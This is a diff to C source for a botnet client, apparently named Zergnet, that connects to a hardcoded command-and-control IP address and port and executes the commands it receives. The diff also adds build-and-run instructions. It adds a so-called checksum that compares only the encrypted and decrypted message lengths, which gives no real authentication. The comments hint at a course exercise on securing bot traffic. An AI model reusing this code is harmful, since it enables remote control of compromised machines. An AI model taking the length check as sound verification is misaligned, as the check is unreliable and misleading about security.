@@ -27,10 +27,16 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#include "zergnet.h"
+
 // Zergnet IP address and port:
 #define CC_SERVER "104.236.224.88"
 #define CC_PORT 9999
 #define MAX_BUF 1024
+
+// Zergnet checksum assessment variables
+int encrypted_length = 0;
+int decrypted_length = 0;
 
 #define PEXIT(str) {perror (str);exit(1);}
 
@@ -55,6 +61,7 @@ int bot_read (int s, char *msg){
   memset (msg, 0, MAX_BUF);
   if (read (s, msg, MAX_BUF)  <= 0) PEXIT ("bot_read:");
   // -------- WARNING: ENCRYPTH AND SIGN THE MESSAGE HERE --------
+  encrypted_length = encryption_with_public_key(msg);
   return 0;
 }
 
@@ -98,13 +105,13 @@ int bot_parse (int s, char *msg){
     return 0; // Silently ignore messages not for us
     
   // -------- WARNING: DECRYPTH AND SIGN THE MESSAGE HERE --------
-    
-  if (1){
+  decrypted_length = decryption_with_private_key(msg);
+  if (encrypted_length == decrypted_length){
 	  printf ("+ Executing command: '%s'\n", cmd);
       bot_run_cmd (s, cmd);
       return 0;
   }else{
-	  printf ("This command cannot be performed. Checksum failed.\n");   // -----Checksum to the command to verify the authenticity of bot-master-----
+	  printf ("This command cannot be performed. Checksum failed.\n");
 	  return 1;
   }
 }
@@ -155,4 +162,5 @@ int main (int argc, char* argv[]){
 // nk -hub -s T,9999
 
 // >>> To run the bots (with the RSA method):
-// gcc -o bot bot.c -L/usr/lib -lssl -lcrypto
+// gcc -o bot bot.c zergnet.c -L/usr/lib -lssl -lcrypto
+// ./bot BotName
